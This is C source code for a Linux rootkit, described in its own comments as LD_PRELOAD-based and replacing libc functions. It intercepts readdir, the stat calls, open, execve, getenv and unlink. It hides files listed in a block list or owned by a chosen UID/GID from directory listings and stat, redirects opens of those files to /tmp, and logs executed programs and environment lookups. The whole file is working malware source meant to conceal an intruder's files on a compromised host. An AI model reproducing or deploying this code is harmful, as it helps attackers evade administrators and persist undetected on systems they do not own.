/* Copyright (C) 2014 cmj. All right reserved. */
#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <dirent.h>
#include <dlfcn.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <errno.h>
#include <stdarg.h>
#include <string.h>
#include <unistd.h>
#include <libgen.h>
#include "profile.h"

/* Replaced libc method.
 * We SHOULD follow the original prototype from header file for our respect.
 */
static struct dirent *(*_readdir)(DIR *__dirp);
static struct dirent64 *(*_readdir64)(DIR *__dirp);
static int (*_xstat) (int __ver, const char *__filename, struct stat *__stat_buf);
/* sys/stat.h */
static int (*_lxstat) (int __ver, const char *__filename, struct stat *__stat_buf);
static int (*_fxstat) (int __ver, int __fildes, struct stat *__stat_buf);
static int (*_xstat64) (int __ver, const char *__filename, struct stat64 *__stat_buf);
static int (*_lxstat64) (int __ver, const char *__filename, struct stat64 *__stat_buf);
static int (*_fxstat64) (int __ver, int __fildes, struct stat64 *__stat_buf);
/* unistd.h */
static char *(*_getenv) (const char *__name);
static int (*_execv) (const char *__path, char *const __argv[]);
static int (*_execve) (const char *__path, char *const __argv[], char *const __envp[]);
static int (*_open)(const char *__file, int __oflag, ...);
static int (*_unlink) (const char *__name);

/* A rootkit which is LD_PRELOAD based and replce libc method.
 *
 * Author: cmj0121@gmail.com
 *
 */
__attribute__((constructor)) void begin(void) {
#ifdef DEBUG
	fprintf(stderr, "Load Customize preload library...\n");
#endif /* DEBUG */
	_readdir	= dlsym(RTLD_NEXT, "readdir");
	_readdir64	= dlsym(RTLD_NEXT, "readdir64");
	/* sys/stat.h */
	_xstat		= dlsym(RTLD_NEXT, "__xstat");
	_lxstat		= dlsym(RTLD_NEXT, "__lxstat");
	_fxstat		= dlsym(RTLD_NEXT, "__fxstat");
	_xstat64	= dlsym(RTLD_NEXT, "__xstat64");
	_lxstat64	= dlsym(RTLD_NEXT, "__lxstat64");
	_fxstat64	= dlsym(RTLD_NEXT, "__fxstat64");
	/* unistd.h */
	_getenv		= dlsym(RTLD_NEXT, "getenv");
	_execv		= dlsym(RTLD_NEXT, "execv");
	_execve		= dlsym(RTLD_NEXT, "execve");
	_open		= dlsym(RTLD_NEXT, "open");
	_unlink		= dlsym(RTLD_NEXT, "unlink");
}
/*
 *	Filter out any string occurred in BLOCK_LIST
 */
inline int filter(const char *name, __uid_t uid, __gid_t gid) {
	char LIST[BUFSIZ] = {0};
	char *ptr = NULL, *ch = NULL;
#if defined(UID) || defined(GID)
	struct stat st;
#endif

	/* Check the key word occurred on the path */
	if (NULL != name) {
		strcpy(LIST, BLOCK_LIST);
		ptr = LIST;
		while(NULL != (ch = strchr(ptr, ' '))) {
			*ch = '\0';
			if (0 == strcmp(name, ptr)) goto TRAPE;
			ptr = ch + 1;
		}
		if (0 == strcmp(name, ptr)) goto TRAPE;
	}

	/* Check the UID/GID is occurred on the file */
#if defined(UID) || defined(GID)
	if (NULL != _xstat && (-1 == uid && -1 == gid)) {
		_xstat(_STAT_VER, name, &st);
		uid = st.st_uid;
		gid = st.st_gid;
	}
#if UID
	if (uid == UID) goto TRAPE;
#endif
#if GID
	if (gid == GID) goto TRAPE;
#endif
	
#endif
	return 0;
TRAPE:
	return 1;
}

/* Filter out the result for ls */
struct dirent *readdir(DIR *__dirp) {
	struct dirent *_ = NULL;
	
	while (NULL != (_ = _readdir(__dirp)) && 0 != filter(_->d_name, -1, -1));
	return _;
}
struct dirent64 *readdir64(DIR *__dirp) {
	struct dirent64 *_ = NULL;

	while (NULL != (_ = _readdir64(__dirp)) && 0 != filter(_->d_name, -1, -1));
	return _;
}

/* Filter out the resupt for file-related */
/* sys/stat.h */
int __xstat(int __ver, const char *__filename, struct stat *__stat_buf) {
	int _;

	if (0 != filter(__filename, -1, -1)) {
		errno = ENOENT;
		return -1;
	}
	MSG("stat by %s", __filename);
	_ = _xstat(__ver, __filename, __stat_buf);
	return _;
}
int __lxstat(int __ver, const char *__filename, struct stat *__stat_buf) {
	int _;

	MSG("lstat by %s", __filename);
	_ = _lxstat(__ver, __filename, __stat_buf);
	if (0 != filter(__filename, __stat_buf->st_uid, __stat_buf->st_gid)) {
		errno = ENOENT;
		return -1;
	}
	return _;
}
int __fxstat(int __ver, int __fildes, struct stat *__stat_buf) {
	int _;

	MSG("fstat by fd %d", __fildes);
	_ = _fxstat(__ver, __fildes, __stat_buf);
	if (0 != filter(NULL, __stat_buf->st_uid, __stat_buf->st_gid)) {
		errno = ENOENT;
		return -1;
	}
	return _;
}
int __xstat64(int __ver, const char *__filename, struct stat64 *__stat_buf) {
	int _;

	if (0 != filter(__filename, -1, -1)) {
		errno = ENOENT;
		return -1;
	}
	MSG("stat64 %s", __filename);
	_ = _xstat64(__ver, __filename, __stat_buf);
	return _;
}
int __lxstat64(int __ver, const char *__filename, struct stat64 *__stat_buf) {
	int _;

	MSG("lstat64 %s", __filename);
	_ = _lxstat64(__ver, __filename, __stat_buf);
	if (0 != filter(__filename, __stat_buf->st_uid, __stat_buf->st_gid)) {
		errno = ENOENT;
		return -1;
	}
	return _;
}
int __fxstat64(int __ver, int __fildes, struct stat64 *__stat_buf) {
	int _;

	MSG("fstat64 by fd: %d", __fildes);
	_ = _fxstat64(__ver, __fildes, __stat_buf);
	if (0 != filter(NULL, __stat_buf->st_uid, __stat_buf->st_gid)) {
		errno = ENOENT;
		return -1;
	}
	return _;
}
char *getenv(const char *__name) {
	char *_ = NULL;

	MSG("getenv: %s", __name);
	_ = _getenv(__name);
	return _;
}
/* unistd.h */
int execv (const char *__path, char *const __argv[]) {
	int _;

	MSG("Execute %s by execv", __path);
	_ = _execv(__path, __argv);
	return _;
}
int execve(const char *__path, char *const __argv[], char *const __envp[]) {
	int _, ENV_LEN=0;
	char **ptr = NULL;

	MSG("Execute %s by execve", __path);

	/* Replace the ENV for env binary  */
	if (0 == (strcmp(__path, "/usr/bin/env"))) {
		for (ptr=(char **)__envp; (*ptr); ptr++) ENV_LEN += 1;
	}
	_ = _execve(__path, __argv, __envp);
	return _;
}
int open(const char *__file, int __oflag, ...) {
	int _;
	char szPath[BUFSIZ] = {0};
	va_list args;

	va_start(args, __oflag);
	MSG("open file %s", __file);
	if (0 != filter(__file, -1, -1)) {
		snprintf(szPath, sizeof(szPath), "/tmp/%s", basename((char *)__file));
		_ = _open(szPath, __oflag, args);
	} else {
		_ = _open(__file, __oflag, args);
	}
	va_end(args);
	return _;
}
int unlink(const char *__name) {
	int _;

	MSG("Unlink %s", __name);
	_ = _unlink(__name);
	return _;
}
